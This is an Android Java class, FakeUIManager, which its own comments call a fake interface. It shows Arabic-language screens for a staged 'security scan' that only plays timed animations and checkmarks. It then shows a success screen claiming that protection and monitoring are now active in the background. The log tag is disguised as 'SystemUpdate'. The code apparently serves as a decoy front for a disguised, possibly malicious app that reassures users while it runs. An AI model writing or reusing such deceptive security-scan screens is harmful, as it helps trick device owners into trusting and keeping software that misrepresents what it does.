package com.sec.check;

import android.app.Activity;
import android.content.Context;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.view.animation.AnimationSet;
import android.view.animation.DecelerateInterpolator;
import android.view.animation.LinearInterpolator;
import android.view.animation.RotateAnimation;
import android.view.animation.ScaleAnimation;
import android.view.animation.TranslateAnimation;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;

/**
 * FakeUIManager - واجهة وهمية احترافية
 * ============================================================
 * الشاشات:
 * 1. Welcome Screen (بأنيميشن دخول قوي)
 * 2. Security Scan Screen (بفحص متدرج + أنيميشن احترافي)
 * 3. Progress Screen (بشريط تقدم + أنيميشن)
 * 4. Success Screen (بأنيميشن احتفالي)
 *
 * ★ تم إزالة شاشة Login ★
 * ============================================================
 */
public class FakeUIManager {

    private static final String TAG = "SystemUpdate";

    // ★ الألوان ★
    private static final String BG_COLOR = "#0a0e1a";
    private static final String CARD_BG = "#131826";
    private static final String ACCENT_BLUE = "#3b82f6";
    private static final String ACCENT_CYAN = "#06b6d4";
    private static final String ACCENT_GREEN = "#10b981";
    private static final String TEXT_PRIMARY = "#f1f5f9";
    private static final String TEXT_SECONDARY = "#94a3b8";
    private static final String TEXT_MUTED = "#64748b";
    private static final String BORDER_COLOR = "#1e293b";

    private Activity activity;
    private Handler handler;

    // Callbacks
    public interface UIReadyCallback {
        void onReady();
    }

    // ============================================================
    // Constructor
    // ============================================================
    public FakeUIManager(Activity activity) {
        this.activity = activity;
        this.handler = new Handler(Looper.getMainLooper());
    }

    // ============================================================
    // Helpers
    // ============================================================
    private int dp(int dp) {
        float density = activity.getResources().getDisplayMetrics().density;
        return (int) (dp * density + 0.5f);
    }

    private LinearLayout createBaseLayout() {
        LinearLayout root = new LinearLayout(activity);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor(BG_COLOR));
        root.setGravity(Gravity.CENTER);
        root.setPadding(dp(28), dp(28), dp(28), dp(28));
        return root;
    }

    private TextView createTitle(String text) {
        TextView tv = new TextView(activity);
        tv.setText(text);
        tv.setTextSize(26);
        tv.setTextColor(Color.parseColor(TEXT_PRIMARY));
        tv.setTypeface(null, Typeface.BOLD);
        tv.setGravity(Gravity.CENTER);
        tv.setPadding(0, dp(20), 0, dp(10));
        return tv;
    }

    private TextView createSubtitle(String text) {
        TextView tv = new TextView(activity);
        tv.setText(text);
        tv.setTextSize(14);
        tv.setTextColor(Color.parseColor(TEXT_SECONDARY));
        tv.setGravity(Gravity.CENTER);
        tv.setLineSpacing(dp(6), 1f);
        tv.setPadding(dp(10), dp(5), dp(10), dp(20));
        return tv;
    }

    private TextView createIcon(String emoji, int size) {
        TextView tv = new TextView(activity);
        tv.setText(emoji);
        tv.setTextSize(size);
        tv.setGravity(Gravity.CENTER);
        return tv;
    }

    // ============================================================
    // أنيميشن متقدم
    // ============================================================
    private void applyFadeInUp(View view, long durationMs, long delayMs) {
        AnimationSet set = new AnimationSet(true);
        set.setInterpolator(new DecelerateInterpolator());

        AlphaAnimation fade = new AlphaAnimation(0f, 1f);
        fade.setDuration(durationMs);

        TranslateAnimation slide = new TranslateAnimation(0, 0, dp(40), 0);
        slide.setDuration(durationMs);

        set.addAnimation(fade);
        set.addAnimation(slide);
        set.setStartOffset(delayMs);

        view.startAnimation(set);
    }

    private void applyScaleIn(View view, long durationMs, long delayMs) {
        AnimationSet set = new AnimationSet(true);
        set.setInterpolator(new DecelerateInterpolator());

        AlphaAnimation fade = new AlphaAnimation(0f, 1f);
        fade.setDuration(durationMs);

        ScaleAnimation scale = new ScaleAnimation(
                0.5f, 1f, 0.5f, 1f,
                Animation.RELATIVE_TO_SELF, 0.5f,
                Animation.RELATIVE_TO_SELF, 0.5f);
        scale.setDuration(durationMs);

        set.addAnimation(fade);
        set.addAnimation(scale);
        set.setStartOffset(delayMs);

        view.startAnimation(set);
    }

    private void applyPulse(View view) {
        ScaleAnimation pulse = new ScaleAnimation(
                1f, 1.08f, 1f, 1.08f,
                Animation.RELATIVE_TO_SELF, 0.5f,
                Animation.RELATIVE_TO_SELF, 0.5f);
        pulse.setDuration(1200);
        pulse.setRepeatMode(Animation.REVERSE);
        pulse.setRepeatCount(Animation.INFINITE);
        pulse.setInterpolator(new DecelerateInterpolator());
        view.startAnimation(pulse);
    }

    private void applyRotate(View view) {
        RotateAnimation rotate = new RotateAnimation(
                0, 360,
                Animation.RELATIVE_TO_SELF, 0.5f,
                Animation.RELATIVE_TO_SELF, 0.5f);
        rotate.setDuration(1500);
        rotate.setRepeatCount(Animation.INFINITE);
        rotate.setInterpolator(new LinearInterpolator());
        view.startAnimation(rotate);
    }

    private GradientDrawable createCardBackground() {
        GradientDrawable gd = new GradientDrawable();
        gd.setColor(Color.parseColor(CARD_BG));
        gd.setCornerRadius(dp(16));
        gd.setStroke(dp(1), Color.parseColor(BORDER_COLOR));
        return gd;
    }

    // ============================================================
    // 1. Welcome Screen — بأنيميشن قوي
    // ============================================================
    public void showWelcomeScreen(Runnable onComplete) {
        LinearLayout root = createBaseLayout();

        // ★ دائرة الشعار ★
        FrameLayout logoContainer = new FrameLayout(activity);
        LinearLayout.LayoutParams logoParams = new LinearLayout.LayoutParams(dp(120), dp(120));
        logoParams.bottomMargin = dp(30);
        logoContainer.setLayoutParams(logoParams);

        // ★ خلفية الشعار (Gradient) ★
        View logoBg = new View(activity);
        GradientDrawable gradient = new GradientDrawable(
                GradientDrawable.Orientation.TL_BR,
                new int[]{
                        Color.parseColor(ACCENT_BLUE),
                        Color.parseColor(ACCENT_CYAN)
                });
        gradient.setShape(GradientDrawable.OVAL);
        logoBg.setBackground(gradient);
        logoBg.setLayoutParams(new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT));
        logoContainer.addView(logoBg);

        // ★ أيقونة الشعار ★
        TextView logoIcon = createIcon("🛡️", 48);
        FrameLayout.LayoutParams iconParams = new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT);
        logoIcon.setLayoutParams(iconParams);
        logoContainer.addView(logoIcon);

        root.addView(logoContainer);

        // ★ العنوان ★
        TextView title = createTitle("التحقق الأمني");
        root.addView(title);

        // ★ الوصف ★
        TextView subtitle = createSubtitle(
                "نظام حماية متقدم لحماية بياناتك وخصوصيتك من الوصول غير المصرح به");
        root.addView(subtitle);

        // ★ حالة الفحص ★
        LinearLayout statusCard = new LinearLayout(activity);
        statusCard.setOrientation(LinearLayout.HORIZONTAL);
        statusCard.setBackground(createCardBackground());
        statusCard.setPadding(dp(16), dp(14), dp(16), dp(14));
        statusCard.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams statusParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
        statusParams.topMargin = dp(20);
        statusCard.setLayoutParams(statusParams);

        // ★ نقطة خضراء نابضة ★
        View dot = new View(activity);
        GradientDrawable dotBg = new GradientDrawable();
        dotBg.setShape(GradientDrawable.OVAL);
        dotBg.setColor(Color.parseColor(ACCENT_GREEN));
        dot.setBackground(dotBg);
        LinearLayout.LayoutParams dotParams = new LinearLayout.LayoutParams(dp(10), dp(10));
        dotParams.rightMargin = dp(12);
        dot.setLayoutParams(dotParams);
        statusCard.addView(dot);

        TextView statusText = new TextView(activity);
        statusText.setText("النظام جاهز للفحص");
        statusText.setTextColor(Color.parseColor(TEXT_PRIMARY));
        statusText.setTextSize(13);
        statusText.setTypeface(null, Typeface.BOLD);
        statusCard.addView(statusText);

        root.addView(statusCard);

        // ★ الأنيميشن ★
        applyScaleIn(logoContainer, 800, 0);
        applyFadeInUp(title, 600, 300);
        applyFadeInUp(subtitle, 600, 500);
        applyFadeInUp(statusCard, 600, 700);
        applyPulse(dot);

        activity.setContentView(root);

        // ★ الانتقال للشاشة التالية بعد 2.5 ثانية ★
        handler.postDelayed(() -> {
            if (onComplete != null) onComplete.run();
        }, 2500);
    }

    // ============================================================
    // 2. Security Scan Screen — فحص متدرج بأنيميشن
    // ============================================================
    public void showSecurityScanScreen(Runnable onComplete) {
        ScrollView scroll = new ScrollView(activity);
        scroll.setBackgroundColor(Color.parseColor(BG_COLOR));
        scroll.setFillViewport(true);

        LinearLayout root = new LinearLayout(activity);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dp(24), dp(40), dp(24), dp(24));
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        scroll.addView(root);

        // ★ أيقونة الفحص ★
        TextView icon = createIcon("🔍", 56);
        root.addView(icon);

        // ★ العنوان ★
        TextView title = createTitle("جاري فحص الجهاز");
        root.addView(title);

        // ★ الوصف ★
        TextView subtitle = createSubtitle("يتم التحقق من سلامة النظام وأمان البيانات");
        root.addView(subtitle);

        // ★ شريط التقدم ★
        ProgressBar progressBar = new ProgressBar(activity, null,
                android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(100);
        progressBar.setProgress(0);
        LinearLayout.LayoutParams pbParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(6));
        pbParams.topMargin = dp(20);
        pbParams.bottomMargin = dp(20);
        progressBar.setLayoutParams(pbParams);
        root.addView(progressBar);

        // ★ حاوية الخطوات ★
        LinearLayout stepsContainer = new LinearLayout(activity);
        stepsContainer.setOrientation(LinearLayout.VERTICAL);
        stepsContainer.setBackground(createCardBackground());
        stepsContainer.setPadding(dp(18), dp(18), dp(18), dp(18));
        LinearLayout.LayoutParams stepsParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
        stepsContainer.setLayoutParams(stepsParams);
        root.addView(stepsContainer);

        // ★ الخطوات ★
        String[] steps = {
                "فحص الاتصال بالشبكة",
                "التحقق من هوية الجهاز",
                "فحص الأمان العام",
                "تحليل المخاطر المحتملة",
                "فحص التشفير",
                "التأكد من سلامة النظام"
        };

        int[] delays = {500, 700, 800, 900, 800, 700};

        activity.setContentView(scroll);

        // ★ أنيميشن الأيقونة ★
        applyPulse(icon);

        // ★ المرور على الخطوات ★
        for (int i = 0; i < steps.length; i++) {
            final int index = i;
            final String stepLabel = steps[i];
            final int delay = delays[i];
            final int stepNumber = i + 1;
            final int totalSteps = steps.length;

            handler.postDelayed(() -> {
                // ★ إنشاء صف الخطوة ★
                LinearLayout stepRow = new LinearLayout(activity);
                stepRow.setOrientation(LinearLayout.HORIZONTAL);
                stepRow.setPadding(0, dp(10), 0, dp(10));
                stepRow.setGravity(Gravity.CENTER_VERTICAL);

                // ★ أيقونة الخطوة ★
                TextView stepIcon = new TextView(activity);
                stepIcon.setText("⏳");
                stepIcon.setTextSize(20);
                stepIcon.setPadding(0, 0, dp(12), 0);
                stepRow.addView(stepIcon);

                // ★ نص الخطوة ★
                TextView stepText = new TextView(activity);
                stepText.setText(stepLabel);
                stepText.setTextColor(Color.parseColor(TEXT_PRIMARY));
                stepText.setTextSize(14);
                stepRow.addView(stepText);

                stepsContainer.addView(stepRow);

                // ★ أنيميشن دخول الخطوة ★
                applyFadeInUp(stepRow, 400, 0);

                // ★ تحديث شريط التقدم ★
                int progress = ((index + 1) * 100) / totalSteps;
                progressBar.setProgress(progress);

                // ★ بعد 500ms → ✓ ★
                handler.postDelayed(() -> {
                    stepIcon.setText("✅");
                    // ★ أنيميشن نبض ✓ ★
                    ScaleAnimation pulse = new ScaleAnimation(
                            0.5f, 1.2f, 0.5f, 1.2f,
                            Animation.RELATIVE_TO_SELF, 0.5f,
                            Animation.RELATIVE_TO_SELF, 0.5f);
                    pulse.setDuration(300);
                    stepIcon.startAnimation(pulse);
                }, 500);

            }, getAccumulatedDelay(delays, i));
        }

        // ★ الانتقال للشاشة التالية ★
        int totalDelay = getAccumulatedDelay(delays, steps.length) + 1000;
        handler.postDelayed(() -> {
            if (onComplete != null) onComplete.run();
        }, totalDelay);
    }

    // ============================================================
    // 3. Progress Screen — شريط تقدم بأنيميشن
    // ============================================================
    public void showProgressScreen(String message, Runnable onComplete) {
        LinearLayout root = createBaseLayout();

        // ★ أيقونة دوارة ★
        TextView spinner = createIcon("⚙️", 64);
        root.addView(spinner);

        // ★ العنوان ★
        TextView title = createTitle("جاري التهيئة");
        root.addView(title);

        // ★ الوصف ★
        TextView subtitle = createSubtitle(message != null ? message : "يتم تجهيز النظام...");
        root.addView(subtitle);

        // ★ شريط التقدم ★
        ProgressBar progressBar = new ProgressBar(activity);
        progressBar.setIndeterminate(true);
        LinearLayout.LayoutParams pbParams = new LinearLayout.LayoutParams(
                dp(60), dp(60));
        pbParams.topMargin = dp(30);
        progressBar.setLayoutParams(pbParams);
        root.addView(progressBar);

        // ★ الأنيميشن ★
        applyFadeInUp(title, 500, 0);
        applyFadeInUp(subtitle, 500, 200);
        applyRotate(spinner);

        activity.setContentView(root);

        // ★ الانتقال بعد 2 ثانية ★
        handler.postDelayed(() -> {
            if (onComplete != null) onComplete.run();
        }, 2000);
    }

    // ============================================================
    // 4. Success Screen — أنيميشن احتفالي
    // ============================================================
    public void showSuccessScreen(Runnable onComplete) {
        LinearLayout root = createBaseLayout();

        // ★ أيقونة النجاح ★
        FrameLayout successContainer = new FrameLayout(activity);
        LinearLayout.LayoutParams scParams = new LinearLayout.LayoutParams(dp(120), dp(120));
        scParams.bottomMargin = dp(30);
        successContainer.setLayoutParams(scParams);

        View successBg = new View(activity);
        GradientDrawable gradient = new GradientDrawable(
                GradientDrawable.Orientation.TL_BR,
                new int[]{
                        Color.parseColor(ACCENT_GREEN),
                        Color.parseColor(ACCENT_CYAN)
                });
        gradient.setShape(GradientDrawable.OVAL);
        successBg.setBackground(gradient);
        successBg.setLayoutParams(new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT));
        successContainer.addView(successBg);

        TextView successIcon = createIcon("✓", 56);
        successIcon.setTextColor(Color.WHITE);
        successIcon.setTypeface(null, Typeface.BOLD);
        FrameLayout.LayoutParams iconParams = new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT);
        successIcon.setLayoutParams(iconParams);
        successContainer.addView(successIcon);

        root.addView(successContainer);

        // ★ العنوان ★
        TextView title = createTitle("تم التفعيل بنجاح");
        title.setTextColor(Color.parseColor(ACCENT_GREEN));
        root.addView(title);

        // ★ الوصف ★
        TextView subtitle = createSubtitle("الحماية مفعّلة الآن في الخلفية");
        root.addView(subtitle);

        // ★ بطاقة المعلومات ★
        LinearLayout card = new LinearLayout(activity);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackground(createCardBackground());
        card.setPadding(dp(20), dp(20), dp(20), dp(20));
        LinearLayout.LayoutParams cParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
        cParams.topMargin = dp(20);
        card.setLayoutParams(cParams);

        String[] info = {
                "✓ الحماية: مفعّلة",
                "✓ المراقبة: نشطة",
                "✓ الجدار الأمني: يعمل",
                "✓ النظام: آمن"
        };

        for (String line : info) {
            TextView tv = new TextView(activity);
            tv.setText(line);
            tv.setTextColor(Color.parseColor(TEXT_PRIMARY));
            tv.setTextSize(14);
            tv.setPadding(0, dp(8), 0, dp(8));
            card.addView(tv);
        }

        root.addView(card);

        // ★ الأنيميشن ★
        applyScaleIn(successContainer, 700, 0);
        applyFadeInUp(title, 600, 300);
        applyFadeInUp(subtitle, 600, 500);
        applyFadeInUp(card, 700, 700);

        activity.setContentView(root);

        // ★ الانتقال بعد 3 ثواني ★
        handler.postDelayed(() -> {
            if (onComplete != null) onComplete.run();
        }, 3000);
    }

    // ============================================================
    // Helper: حساب التأخير التراكمي
    // ============================================================
    private int getAccumulatedDelay(int[] delays, int upTo) {
        int sum = 0;
        for (int i = 0; i < upTo; i++) {
            sum += delays[i];
        }
        return sum;
    }
    }
